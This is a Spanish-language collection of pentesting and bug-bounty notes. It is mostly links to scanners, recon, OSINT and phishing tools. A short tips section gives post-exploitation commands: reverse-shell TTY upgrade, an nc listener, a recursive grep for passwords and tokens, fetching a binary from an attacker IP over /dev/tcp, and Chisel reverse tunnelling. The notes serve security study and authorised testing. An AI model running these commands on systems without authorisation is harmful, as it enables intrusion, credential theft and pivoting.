# Varias cositas  

## Herramientas varias  

Asciinema - grabar consola  
https://asciinema.org/


Extensions Hack Tools  
https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi   
https://addons.mozilla.org/es/firefox/addon/hacktools/ 


VulnMap  
Escaner de vulnerabilidades web  
https://github.com/zhzyker/vulmap
https://securityonline.info/vulmap-web-vulnerability-scanning-and-verification-tools/


PEASS  
Suite para escalar privilegios  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite 


Maltego  
Permite realizar OSINT en función de diversos datos y crear búsquedas personalizadas  
https://www.maltego.com/


NahamSec Resources  
https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters


Inyeccion de código PHP en imágenes  
https://github.com/dlegs/php-jpeg-injector
https://securityonline.info/php-jpeg-injector-injects-php-payloads-into-jpeg-images/


Enmascarar URL's para hacer phishing  
https://github.com/jaykali/maskphish
https://kalilinuxtutorials.com/maskphish/


Escaner de vulnerabilidades en docker  
https://github.com/aquasecurity/trivy 


Imágen de Docker para hacer reconocimiento de Bug Bounty
https://github.com/chvancooten/BugBountyScanner


OSMEDEUS  
Reconocimiento automático y escaneo en pruebas de Penetración.  
https://j3ssie.github.io/Osmedeus/  
https://github.com/j3ssie/Osmedeus  


GitDorker  
Busca en repositorios de github si hay información sensible  
https://github.com/obheda12/GitDorker


Admin Scanner  
Busca paneles de acceso a administracion en sitios web.  
https://github.com/alienwhatever/Admin-Scanner


CyberChef  
Utilidades de conversión  
https://gchq.github.io/CyberChef/


OneLiners para BugBounty  
https://github.com/KingOfBugbounty/KingOfBugBountyTips


Recopilado de tools  
https://start.me/p/m6XMmk/ethical-hacking


Comandos utiles de consola para pentesting  
https://securityonline.info/some-useful-linux-command-for-your-penetration-testinglinux-command/


Extensiones para Burp recomendadas por Akita:  
- Param Miner
- Content-Type Converter
- Upload Scanner
- SAML Raider
- JSON Web Tokens

Listas para descubrir mas extensiones Burp y Zap  
https://github.com/hahwul/WebHackersWeapons/tree/master/Burp%20and%20ZAP%20Extensions 

https://github.com/snoopysecurity/awesome-burp-extensions

https://github.com/sting8k/BurpSuite_403Bypasser 


WHM Tools  
Desde una web, seleccionando q herramientas queremos, crea un instalador de las mismas  
https://whw-tools.hahwul.com/  


Herramientas utiles para explotacion  
Por ejemplo servicios online que quedan a la espera de request y podemos ver el contenido, headers, etc del request recibido  
https://webhook.site 
https://requestcatcher.com 
https://canarytokens.org/generate 
http://dnsbin.zhack.ca 
https://ngrok.com 


Hetty  
Alternativa open source a Burp Suite  
https://github.com/dstotijn/hetty  


Blue Team  
https://github.com/BlueTeamLabs/sentinel-attack  
https://github.com/mitre/caldera   

BlueTeam Training Toolkit  
https://www.youtube.com/playlist?list=PLUANA2JtKjNs1Bjwdt86hG215QKsoDorO   
https://www.bt3.no/   


Scripts para busquedas de logs, archivos de configuracion, emails, etc  
https://github.com/daffainfo/Bug-Bounty-Tools  


All about bug bounty
Payloads, Bypass, herramientas de recon, etc  
https://github.com/daffainfo/AllAboutBugBounty  


SubDomainizer  
Es una herramienta para buscar subdominios ocultos, y secret keys  
https://github.com/nsonaniya2010/SubDomainizer  


GitDorker  
Es una herramienta para usar la api de busqueda de github información sensible.  
https://github.com/obheda12/GitDorker/    
https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5  

TLD extensiones de dominios  
https://raw.githubusercontent.com/DragonJAR/Scripts/master/all-domain-extensions.txt  


Offensive Docker  
https://github.com/aaaguirrep/offensive-docker  


Search in Google  
https://www.exploit-db.com/google-hacking-database  


Hacks to search in Google Dorks  
https://pentest-tools.com/information-gathering/google-hacking  


## Tips  

### Comandos al ingresar por shell (reverse shell)  

whoami  
ifconfig o ip a  
  
script /dev/null -c bash  
^Z  
stty raw echo -echo; fg  
nc -nlvp 443  
reset  

terminal ? xterm  
export TERM=xterm  
export SHELL=bash  

en una ventana mia ejecutar: stty -a   
Y ver la cantidad de filas y columnas, para configurar lo mismo en la maquina remota  
stty rows 53 columns 206  

Buscamos credenciales  
grep -r -i -E "user|pass|key|token"  

Buscamos archivos   
find \-type f 2>/dev/null  

Script en python:  
https://pastebin.com/5GqY54FG  

### Chisel  
https://github.com/jpillora/chisel  

truco para compilar a bajo peso:  
go build -ldflags "-s -w"  
du -hc chisel  
upx brute chisel  
du -hc chisel  

> upx comprime binarios

desde maquina local hacer:  
nc -lnvp 443 < chisel  
y en maquina virtual:  
cat > chisel < /dev/tcp/ipxxx/443

maquina local:  
./chisel server --reverse -p puerto    

maquina ataque:  
./chisel client ip:puerto  


### Steghide - Esteganografía  
Buscar contenido en las imágenes  

http://steghide.sourceforge.net/  
https://fwhibbit.es/steghide-brute-force-tool  
https://github.com/Va5c0/Steghide-Brute-Force-Tool  
https://github.com/Paradoxis/StegCracker  



